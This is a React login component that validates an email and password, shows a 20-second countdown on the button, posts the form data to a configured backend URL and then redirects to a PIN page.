// Home.js
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/home.css";
import "../App.css";
import logo from "../assets/logo.png";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  email: yup.string().required("Email is required"),
  password: yup
    .string()
    .required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [countdown, setCountdown] = useState(0);
  
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const submitForm = (data) => {
    setLoading(true);
    setCountdown(20);
    
    // Start countdown
    const countdownInterval = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(countdownInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    // Wait 20 seconds before making the API call
    setTimeout(() => {
      axios
        .post(`${BASE_URL}/`, data)
        .then((response) => {
          console.log(response.data);
          navigate("/pin");
        })
        .catch((error) => {
          console.error("There was an error!", error);
        })
        .finally(() => {
          setLoading(false);
          setCountdown(0);
        });
    }, 20000);
  };

  return (
    <div className="home">
      <div className="container">
        <div className="contentSec">
          <div className="logo">
            <img src={logo} alt="logo" />
          </div>
          <div className="title">Hey, there!</div>
        </div>
        <div className="loginWrapper">
          <div className="loginSec">
            <form onSubmit={handleSubmit(submitForm)}>
              <label htmlFor="email">Email Address</label>
              <div className="formInput">
                <input
                  name="email"
                  type="email"
                  placeholder="example@email.com"
                  required
                  {...register("email")}
                />
              </div>
              <FormErrMsg errors={errors} inputName="email" />
              <label htmlFor="password">Password</label>
              <div className="formInput">
                <input
                  name="password"
                  type="password"
                  placeholder="***********"
                  required
                  {...register("password")}
                />
              </div>
              <FormErrMsg errors={errors} inputName="password" />
              <button type="submit" disabled={loading}>
                {loading 
                  ? countdown > 0 
                    ? `Please wait... ${countdown}s` 
                    : "Processing..."
                  : "Sign In"
                }
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Home;
